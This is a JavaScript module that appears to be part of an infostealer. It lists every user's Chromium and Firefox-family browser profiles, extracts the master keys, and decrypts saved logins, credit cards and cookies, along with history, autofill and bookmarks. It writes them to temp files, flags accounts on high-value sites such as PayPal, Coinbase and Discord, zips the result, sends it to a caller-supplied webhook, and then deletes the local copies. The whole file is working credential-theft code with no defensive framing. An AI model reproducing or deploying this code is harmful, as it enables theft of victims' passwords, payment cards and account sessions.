const os = require('os');
const fs = require('fs');
const path = require('path');

const structures = require('./structures.js');
const browsersPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const browsersProfiles = require('./profiles.js');

const { Chromium } = require('./chromium.js');
const chromium = new Chromium();

const { Gecko } = require('./gecko.js');
const gecko = new Gecko();

const browsers = {
    downloads: [],
    historys: [],
    bookmarks: [],
    autofills: [],
    logins: [],
    creditcards: [],
    cookies: []
};

const BrowserStats = structures.BrowserStatistics;

const Chromiumbrowsers = async () => {
    const profiles = [];
    const users = await hardware.getUsers();

    for (const user of users) {
        for (const [name, relativePath] of Object.entries(browsersPaths.getChromiumBrowsers())) {
            const fullPath = path.join(user, relativePath);

            if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
                continue;
            }

            const browser = {
                name: name,
                path: fullPath,
                user: user.split(path.sep)[2]
            };

            BrowserStats.addUsers(user);

            let profilePaths = browsersProfiles.getChromiumProfiles(fullPath, name).map(profile => ({
                ...profile,
                browser: browser
            }));

            const MasterKey = chromium.GetMasterKey(fullPath)

            if (!MasterKey) {
                continue;
            }

            if (profilePaths.length === 0) {
                continue;
            }

            for (const profile of profilePaths) {
                profile.downloads = await chromium.GetDownloads(profile.path) || [];
                profile.historys = await chromium.GetHistorys(profile.path) || [];
                profile.bookmarks = await chromium.GetBookmarks(profile.path) || [];
                profile.autofills = await chromium.GetAutofills(profile.path) || [];
                profile.logins = await chromium.GetLogins(profile.path, MasterKey) || [];
                profile.creditcards = await chromium.GetCreditCards(profile.path, MasterKey) || [];
                profile.cookies = await chromium.GetCookies(profile.path, MasterKey) || [];
                profiles.push(profile);
            }
        }
    }

    return profiles
};

const Geckobrowsers = async () => {
    const profiles = [];
    const users = await hardware.getUsers();

    for (const user of users) {
        for (const [name, relativePath] of Object.entries(browsersPaths.getGeckoBrowsers())) {
            const fullPath = path.join(user, relativePath);

            if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
                continue;
            }

            const browser = {
                name: name,
                path: fullPath,
                user: user.split(path.sep)[2]
            };

            let profilePaths = browsersProfiles.getGeckoProfiles(fullPath, name).map(profile => ({
                ...profile,
                browser: browser
            }));

            if (profilePaths.length === 0) {
                continue;
            }

            for (const profile of profilePaths) {
                const MasterKey = await gecko.GetMasterKey(profile.path, '')

                if (!MasterKey) {
                    continue;
                }

                profile.downloads = await gecko.GetDownloads(profile.path) || [];
                profile.historys = await gecko.GetHistorys(profile.path) || [];
                profile.bookmarks = await gecko.GetBookmarks(profile.path) || [];
                profile.autofills = [];
                profile.logins = await gecko.GetLogins(profile.path, MasterKey) || [];
                profile.creditcards = [];
                profile.cookies = await gecko.GetCookies(profile.path) || [];
                profiles.push(profile);
            }
        }
    }

    return profiles
};

module.exports = async (webhookUrl) => {
    const profiles = [...await Chromiumbrowsers(), ...await Geckobrowsers()]

    if (profiles.length === 0) {
        return [];
    }

    const browserTempDir = path.join(os.tmpdir(), 'browsers-temp');
    for (const profile of profiles) {
        const destBrowser = path.join(browserTempDir, profile.browser.user, profile.browser.name, profile.profile);

        if (!fs.existsSync(destBrowser)) {
            fs.mkdirSync(destBrowser, { recursive: true })
        }

        const profileInfo = {
            browserTempPath: destBrowser,
            user: profile.browser.user,
            browser: profile.browser.name,
            profile: profile.profile,
        };

        browsers.downloads.push({ ...profileInfo, downloads: profile.downloads });
        browsers.historys.push({ ...profileInfo, historys: profile.historys });
        browsers.bookmarks.push({ ...profileInfo, bookmarks: profile.bookmarks });
        browsers.autofills.push({ ...profileInfo, autofills: profile.autofills });
        browsers.logins.push({ ...profileInfo, logins: profile.logins });
        browsers.creditcards.push({ ...profileInfo, creditcards: profile.creditcards });
        browsers.cookies.push({ ...profileInfo, cookies: profile.cookies });
    }

    BrowserStats.updateStatistics(
        browsers.downloads.reduce((acc, { downloads }) => acc + downloads?.length, 0),
        browsers.historys.reduce((acc, { historys }) => acc + historys?.length, 0),
        browsers.bookmarks.reduce((acc, { bookmarks }) => acc + bookmarks?.length, 0),
        browsers.autofills.reduce((acc, { autofills }) => acc + autofills?.length, 0),
        browsers.logins.reduce((acc, { logins }) => acc + logins?.length, 0),
        browsers.creditcards.reduce((acc, { creditcards }) => acc + creditcards?.length, 0),
        browsers.cookies.reduce((acc, { cookies }) => acc + cookies?.length, 0),
    );

    for (const { browserTempPath, downloads } of browsers.downloads) {
        await fileutil.writeDataToFile(browserTempPath, `downloads.txt`, downloads)
    }

    for (const { browserTempPath, historys } of browsers.historys) {
        await fileutil.writeDataToFile(browserTempPath, `historys.txt`, historys)
    }

    for (const { browserTempPath, bookmarks } of browsers.bookmarks) {
        await fileutil.writeDataToFile(browserTempPath, `bookmarks.txt`, bookmarks)
    }

    for (const { browserTempPath, autofills } of browsers.autofills) {
        await fileutil.writeDataToFile(browserTempPath, `autofills.txt`, autofills)
    }

    for (const { browserTempPath, logins } of browsers.logins) {
        await fileutil.writeDataToFile(browserTempPath, `logins.txt`, logins)
    }

    for (const { browserTempPath, creditcards } of browsers.creditcards) {
        await fileutil.writeDataToFile(browserTempPath, `credit_cards.txt`, creditcards)
    }

    for (const { browserTempPath, browser, cookies } of browsers.cookies) {
        await fileutil.writeDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies)
    }

    const keywords = (data) => {
        const sites = [
            "replit", "hostinger", "cloudflare", "origin", "amazon", "twitter", "aliexpress", "netflix", "roblox", "twitch",
            "facebook", "riotgames", "card", "github", "telegram", "protonmail", "gmail", "youtube", "onoff",
            "xss.is", "pronote", "ovhcloud", "nulled", "cracked", "tiktok", "yahoo", "gmx", "aol",
            "coinbase", "binance", "steam", "epicgames", "discord", "paypal", "instagram", "spotify",
            "onlyfans", "pornhub",
        ];

        const loginSites = new Set();
        const cookieSites = new Set();

        data.forEach(item => {
            const url = item.origin_url;
            const match = url.match(/(?:https?:\/\/)?(?:www\.)?(\.?([^\/]+))?(.*)/);

            if (match) {
                const parts = match[2]?.split('.') || [];
                const domain = parts.length > 1
                    ? parts[parts.length - 2] + '.' + parts[parts.length - 1]
                    : parts[0];

                if (sites.some(site => domain.includes(site))) {
                    if (item.source === 'logins') {
                        loginSites.add(domain);
                    } else if (item.source === 'cookies') {
                        cookieSites.add(domain);
                    }
                }
            }
        });

        return {
            loginSites: Array.from(loginSites),
            cookieSites: Array.from(cookieSites)
        }
    };

    const resultKeywords = keywords([...chromium.GetSites(), ...gecko.GetSites()]);

    const browserTempZip = path.join(os.tmpdir(), 'browsers.zip');
    try {
        await fileutil.zipDirectory({
            inputDir: browserTempDir,
            outputZip: browserTempZip
        });

        const data = {
            embeds: [{
                title: 'Browsers',
                description: '```' + fileutil.tree(browserTempDir) + '```',
            }]
        };

        if (
            resultKeywords.loginSites.length > 0 ||
            resultKeywords.cookieSites.length > 0
        ) {
            data.embeds.unshift({
                title: 'Keywords',
                fields: [],
            });
        };

        if (resultKeywords.loginSites.length > 0) {
            data.embeds[0].fields.push({
                name: 'Logins',
                value: resultKeywords.loginSites
                    .map(x =>'[`' + x + '`](https://' + x + ')')
                    .join(', '),
                inline: false
            });
        };

        if (resultKeywords.cookieSites.length > 0) {
            data.embeds[0].fields.push({
                name: 'Cookies',
                value: resultKeywords.cookieSites
                    .map(x => '[`' + x + '`](https://' + x + ')')
                    .join(', '),
                inline: false
            });
        };

        await requests.webhook(webhookUrl, data, [browserTempZip]);

        const WishTempDir = fileutil.WishTempDir('browsers');
        await fileutil.copy(browserTempDir, WishTempDir);

        [browserTempDir, browserTempZip].forEach(async dir => {
            await fileutil.removeDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};